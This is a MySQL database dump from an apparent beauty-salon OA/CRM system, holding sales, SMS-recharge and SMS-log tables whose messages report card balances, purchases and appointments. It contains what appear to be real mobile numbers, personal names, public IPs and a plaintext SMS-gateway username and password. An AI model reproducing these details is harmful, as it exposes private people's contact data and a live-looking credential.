INSERT INTO `xy_shou` VALUES ('2', '1', '陈高明', '2015-06-02 10:17:46', '0', '', '0000-00-00 00:00:00', '1', '2', '深圳腾讯公司', '1506020002', '公司账号', '8850', '王旭东', '一次性付款', '1433211434', '审核通过', '陈高明', '美容院管理系统安装版');
INSERT INTO `xy_shou` VALUES ('5', '16', '王晓丹', '2015-07-05 04:18:20', '0', '', '0000-00-00 00:00:00', '1', '11', '1', '150616280005', '公司账号', '100', '', '', '1436041055', '审核通过', '王晓丹', '33333');
INSERT INTO `xy_shou` VALUES ('8', '16', '王晓丹', '2015-08-04 13:54:18', '16', '王晓丹', '2015-08-12 14:05:49', '1', '13', '南昌房屋中介服务', '150711440007', '公司账号', '99', '', 'ddddddddd', '1438667609', '退回修改', '王晓丹', '11');
INSERT INTO `xy_shou` VALUES ('6', '1', '陈高明', '2015-07-08 17:28:09', '0', '', '0000-00-00 00:00:00', '1', '12', '', '150708060006', '公司账号', '100', '', '', '1436347067', '审核通过', '陈高明', '111');

-- ----------------------------
-- Table structure for `xy_sms`
-- ----------------------------
DROP TABLE IF EXISTS `xy_sms`;
CREATE TABLE `xy_sms` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `dianhua` varchar(50) NOT NULL,
  `url` varchar(255) NOT NULL,
  `yzm` varchar(50) NOT NULL,
  `yue` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='短信管理';

-- ----------------------------
-- Records of xy_sms
-- ----------------------------
INSERT INTO `xy_sms` VALUES ('1', '1', '陈高明', '2015-05-19 11:39:49', '1', '陈高明', '2015-07-06 09:22:42', '1', '信友科技', '13812349563', '127.0.0.1', '123456789a', '1109', 'liuxing99');

-- ----------------------------
-- Table structure for `xy_smscz`
-- ----------------------------
DROP TABLE IF EXISTS `xy_smscz`;
CREATE TABLE `xy_smscz` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `cid` int(11) NOT NULL,
  `title` varchar(50) NOT NULL,
  `jine` int(11) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='短信充值';

-- ----------------------------
-- Records of xy_smscz
-- ----------------------------
INSERT INTO `xy_smscz` VALUES ('2', '1', '陈高明', '2015-05-31 22:03:40', '0', '', '0000-00-00 00:00:00', '1', '1', '信友科技', '1', '10', '10');
INSERT INTO `xy_smscz` VALUES ('3', '1', '陈高明', '2015-06-16 12:20:54', '0', '', '0000-00-00 00:00:00', '1', '1', '信友科技', '100', '1250', '充值');

-- ----------------------------
-- Table structure for `xy_smsfs`
-- ----------------------------
DROP TABLE IF EXISTS `xy_smsfs`;
CREATE TABLE `xy_smsfs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `addtime` datetime NOT NULL,
  `jieguo` varchar(100) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `cid` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `content` varchar(255) NOT NULL,
  `ip` varchar(50) NOT NULL,
  `url` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=165 DEFAULT CHARSET=utf8 COMMENT='发送记录';

-- ----------------------------
-- Records of xy_smsfs
-- ----------------------------
INSERT INTO `xy_smsfs` VALUES ('1', '2015-05-19 16:34:39', '成功', '1', '1', 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('2', '2015-05-19 16:36:13', '成功', '1', '1', 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('3', '2015-05-19 16:36:39', '成功', '1', '1', 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('4', '2015-05-19 17:24:50', '成功', '1', '1', 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('5', '2015-05-19 17:24:53', '成功', '1', '1', 'liuxing99', '18951251872', '【OA】验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('6', '2015-05-19 19:50:32', '成功', '1', '1', 'liuxing99', '18951251872', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('7', '2015-05-19 19:51:38', '成功', '1', '1', 'liuxing99', '18951251872', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('8', '2015-05-19 19:52:49', '成功', '1', '1', 'liuxing99', '18951250018', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('9', '2015-05-19 19:52:50', '成功', '1', '1', 'liuxing99', '18951250018', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('10', '2015-05-19 19:55:21', '成功', '1', '1', 'liuxing99', '18951250018', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('11', '2015-05-19 19:56:19', '成功', '1', '1', 'liuxing99', '13812349563', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('12', '2015-05-19 19:56:21', '成功', '1', '1', 'liuxing99', '13812349563', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('13', '2015-05-19 19:58:19', '成功', '1', '1', 'liuxing99', '18951251872', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('14', '2015-05-31 22:00:57', '成功', '1', '1', 'liuxing99', '13812349563', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('15', '2015-05-31 22:01:10', '成功', '1', '1', 'liuxing99', '18951251872', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('16', '2015-06-03 09:58:53', '成功', '1', '1', 'liuxing99', '13812349563', '【OA】OA系统验证码为12015200，24小时之内有效', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('17', '2015-06-16 10:10:43', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】恭喜您成为本店会员,级别:普通会员,卡号:666666卡余额:500.00', '127.0.0.1', '/mms/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('18', '2015-06-16 13:13:50', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 13:17:33次卡消费成功,次卡余额1,卡余额:0.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('19', '2015-06-16 13:21:30', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 13:17:33次卡消费成功,次卡余额1,卡余额:0.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('20', '2015-06-16 13:48:04', '成功', '1', '1', 'liuxing99', '13812349563', '【OA】尊敬的客户：恭喜您！您于{Time}成为本店会员，会员卡号为{CardID}，感谢您的光临！', '127.0.0.1', '/weboa/index.php?m=Home');
INSERT INTO `xy_smsfs` VALUES ('21', '2015-06-16 14:27:23', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】尊敬的客户:恭喜您的卡号:888888于2015-06-16 14:31:33充值100,卡余额:3306.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('22', '2015-06-16 14:29:05', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 14:33:15商品消费950,卡余额:150.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('23', '2015-06-16 14:33:37', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:于2015-06-16 14:37:47消费撤单-950.00,卡余额:1100.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Xiaofei&a=chedan');
INSERT INTO `xy_smsfs` VALUES ('24', '2015-06-16 14:36:22', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-16 14:40:32积分增加50,积分余额:215 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Duihuan&a=biandongok');
INSERT INTO `xy_smsfs` VALUES ('25', '2015-06-16 14:39:16', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-16 14:43:26次卡消费成功,次卡余额0,卡余额:1100.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiciok');
INSERT INTO `xy_smsfs` VALUES ('26', '2015-06-16 14:46:13', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-16 14:50:23由普通会员调整为银卡会员 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('27', '2015-06-16 14:46:14', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-16 14:50:24商品消费1900,卡余额:0.00 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('28', '2015-06-16 14:49:36', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 14:53:46充次卡,次卡余额20,卡余额:0.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('29', '2015-06-16 14:53:00', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】尊敬的客户:恭喜您的卡号:888888于2015-06-16 14:57:09充值1010,卡余额:4316.00 魅力无限美容院解放路总店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('30', '2015-06-16 14:53:57', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】尊敬的客户:恭喜您的卡号:18961314946于2015-06-16 14:58:07充值1010,卡余额:1205.00 魅力无限美容院解放路总店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('31', '2015-06-16 14:54:36', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:恭喜您的卡号:666666于2015-06-16 14:58:46充值1100,卡余额:1100.00 魅力无限美容院解放路总店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('32', '2015-06-17 17:52:12', '成功', '1', '1', 'liuxing99', '18205134946', '【CRM】尊敬的客户:恭喜您于2015-06-17 18:01:31成为本店会员,级别:普通会员,卡号:18205134946,卡余额:1000.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('33', '2015-06-17 17:58:18', '成功', '1', '1', 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:07:42商品消费665,卡余额:335.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('34', '2015-06-17 18:03:49', '成功', '1', '1', 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:13:14充值3200,卡余额:3535.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('35', '2015-06-17 18:05:58', '成功', '1', '1', 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:15:22由普通会员调整为银卡会员 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('36', '2015-06-17 18:05:59', '成功', '1', '1', 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:15:23充次卡,次卡余额8,卡余额:1464.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('37', '2015-06-17 18:06:54', '成功', '1', '1', 'liuxing99', '18205134946', '【CRM】尊敬的客户:您的卡号:18205134946于2015-06-17 18:16:19次卡消费成功,次卡余额6,卡余额:1464.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Sale&a=jiciok');
INSERT INTO `xy_smsfs` VALUES ('38', '2015-06-17 18:18:38', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-17 18:22:31商品消费192,卡余额:4124.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('39', '2015-06-17 18:31:26', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】尊敬的客户:您的卡号:18961314946于2015-06-17 18:40:49次卡消费成功,次卡余额16,卡余额:1205.00 魅力无限灌云店 退订回复TD', '49.88.12.6', '/mms/index.php?m=Home&c=Sale&a=jiciok');
INSERT INTO `xy_smsfs` VALUES ('40', '2015-06-17 18:40:35', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-17 18:44:27商品消费240,卡余额:3884.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('41', '2015-06-17 18:43:38', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-17 18:47:32商品消费240,卡余额:3644.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('42', '2015-06-24 13:11:23', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-24 13:15:17商品消费272,卡余额:3180.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('43', '2015-06-24 13:39:28', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-24 13:43:29快速消费1000,卡余额:100.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=kshyok');
INSERT INTO `xy_smsfs` VALUES ('44', '2015-06-24 13:40:20', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】尊敬的客户:您的卡号:666666于2015-06-24 13:44:20充值2200,卡余额:2300.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('45', '2015-06-24 13:43:08', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】尊敬的客户:您的卡号:888888于2015-06-24 13:47:08商品消费240,卡余额:2940.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('46', '2015-06-24 20:22:01', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】尊敬的客户:您的卡号:18961314946于2015-06-24 20:31:33充次卡,次卡余额17,卡余额:1205.00 魅力无限灌云店 退订回复TD', '49.88.13.156', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('47', '2015-06-24 20:25:28', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】尊敬的客户:您的卡号:18961314946于2015-06-24 20:35:04商品消费95,卡余额:1110.00 魅力无限灌云店 退订回复TD', '49.88.13.156', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('48', '2015-07-01 10:17:22', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-01 10:21:20商品消费192,卡余额:2748.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('49', '2015-07-01 11:14:16', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-01 11:18:17商品消费80,卡余额:2668.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('50', '2015-07-01 14:06:29', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:会员:陈高明预约了您，顾客将在2015-07-02 09:00:00到店，请做好准备！ 总部 退订回复TD', '127.0.0.1', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('51', '2015-07-01 14:13:45', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:会员陈高明预约了您，顾客将在2015-07-03 16:00:00到店，请做好准备！ 全部店铺 退订回复TD', '192.168.0.2', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('52', '2015-07-01 14:21:06', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:会员陈高明预约了您，顾客将在2010-07-03 10:00:00到店，请做好准备！ 全部店铺 退订回复TD', '192.168.0.2', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('53', '2015-07-01 14:22:21', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-01 14:26:22充值1020,卡余额:3688.00 总部 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('54', '2015-07-01 14:36:17', '成功', '1', '1', 'liuxing99', '18951250018', '【CRM】亲:会员陈高明预约了您，顾客将在2015-07-03 10:00:00到店，请做好准备！ 总部 退订回复TD', '127.0.0.1', '/mms/index.php?m=Member&c=Index&a=yuyue_add');
INSERT INTO `xy_smsfs` VALUES ('55', '2015-07-02 08:28:27', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-02 08:32:22充值550,卡余额:4238.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongzhi');
INSERT INTO `xy_smsfs` VALUES ('56', '2015-07-02 08:29:27', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-02 08:33:26商品消费112,卡余额:4126.00 魅力无限东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('57', '2015-07-02 08:44:30', '成功', '1', '1', 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-02 08:48:22退款1020,卡余额:3106.00 总部 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=tuikuanok');
INSERT INTO `xy_smsfs` VALUES ('58', '2015-07-02 20:32:03', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:恭喜您于2015-07-02 20:41:51成为本店会员,级别:银卡会员,卡号:18961314946,卡余额:5000.00 美丽人身美容院海州店 退订回复TD', '49.88.18.238', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('59', '2015-07-02 21:08:30', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18951251872于2015-07-02 21:18:18由银卡会员调整为普通会员 美丽人身美容院海州店 退订回复TD', '49.88.18.238', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('60', '2015-07-02 21:08:33', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:恭喜您于2015-07-02 21:18:19成为本店会员,级别:普通会员,卡号:18951251872,卡余额:10000.00 美丽人身美容院海州店 退订回复TD', '49.88.18.238', '/mms/index.php?m=Home&c=Huiyuan&a=add');
INSERT INTO `xy_smsfs` VALUES ('61', '2015-07-02 21:13:55', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-02 21:23:39商品消费959.5,卡余额:4040.50 美丽人身美容院海州店 退订回复TD', '49.88.18.238', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('62', '2015-07-03 09:58:56', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:于2015-07-03 10:08:42消费撤单-959.50,卡余额:5000.00 美丽人身美容院海州店 退订回复TD', '180.127.66.229', '/mms/index.php?m=Home&c=Xiaofei&a=chedan');
INSERT INTO `xy_smsfs` VALUES ('63', '2015-07-03 10:03:28', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 10:13:16由普通会员调整为银卡会员 美丽人身美容院海州店 退订回复TD', '180.127.66.229', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('64', '2015-07-03 10:03:28', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 10:13:17充次卡,次卡余额5,卡余额:3290.00 美丽人身美容院海州店 退订回复TD', '180.127.66.229', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('65', '2015-07-03 10:11:51', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 10:21:40快速消费290,卡余额:3000.00 美丽人身美容院海州店 退订回复TD', '180.127.66.229', '/mms/index.php?m=Home&c=Sale&a=kshyok');
INSERT INTO `xy_smsfs` VALUES ('66', '2015-07-03 15:07:54', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:17:39由铂金卡会员调整为普通会员 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('67', '2015-07-03 15:07:55', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:17:44商品消费757.5,卡余额:9242.50 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('68', '2015-07-03 15:12:03', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:21:52由普通会员调整为银卡会员 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('69', '2015-07-03 15:12:04', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:21:53商品消费427.5,卡余额:8815.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('70', '2015-07-03 15:21:50', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 15:31:34商品消费664,卡余额:2336.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('71', '2015-07-03 15:36:25', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:46:13商品消费360,卡余额:8455.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('72', '2015-07-03 15:38:03', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 15:47:52商品消费288,卡余额:8167.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=shangpin');
INSERT INTO `xy_smsfs` VALUES ('73', '2015-07-03 15:40:31', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 15:50:20次卡消费成功,次卡余额4,卡余额:2336.00 美丽人身美容院海州店 退订回复TD', '117.92.166.174', '/mms/index.php?m=Home&c=Sale&a=jiciok');
INSERT INTO `xy_smsfs` VALUES ('74', '2015-07-03 20:04:08', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 20:07:55商品消费360,卡余额:7807.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('75', '2015-07-03 20:12:56', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:于2015-07-03 20:16:43消费撤单-757.50,卡余额:8564.50 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Xiaofei&a=chedan');
INSERT INTO `xy_smsfs` VALUES ('76', '2015-07-03 20:20:51', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 20:24:43快速消费3000,卡余额:0.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=kshyok');
INSERT INTO `xy_smsfs` VALUES ('77', '2015-07-03 20:22:02', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:于2015-07-03 20:25:58消费撤单-3000.00,卡余额:2336.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Xiaofei&a=chedan');
INSERT INTO `xy_smsfs` VALUES ('78', '2015-07-03 20:29:14', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:18961314946于2015-07-03 20:33:06快速消费4000,卡余额:0.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=kshyok');
INSERT INTO `xy_smsfs` VALUES ('79', '2015-07-03 20:29:32', '成功', '1', '1', 'liuxing99', '18961314946', '【CRM】亲:您的卡号:于2015-07-03 20:33:28消费撤单-4000.00,卡余额:2336.00 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Xiaofei&a=chedan');
INSERT INTO `xy_smsfs` VALUES ('80', '2015-07-03 21:34:25', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 21:38:20充次卡,次卡余额10,卡余额:5684.50 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Ka&a=chongciok');
INSERT INTO `xy_smsfs` VALUES ('81', '2015-07-03 21:35:55', '成功', '1', '1', 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-03 21:39:51次卡消费成功,次卡余额8,卡余额:5684.50 美丽人身美容院海州店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiciok');
INSERT INTO `xy_smsfs` VALUES ('82', '2015-07-06 09:13:38', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 09:23:32商品消费1140,卡余额:870.00 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Sale&a=jiesuanok');
INSERT INTO `xy_smsfs` VALUES ('83', '2015-07-06 09:17:15', '成功', '1', '1', 'liuxing99', '15651110214', '【CRM】亲:您的卡号:15651110214于2015-07-06 09:27:08由普通会员调整为银卡会员 美丽人身美容院东海店 退订回复TD', '114.237.212.6', '/mms/index.php?m=Home&c=Ka&a=chongciok');
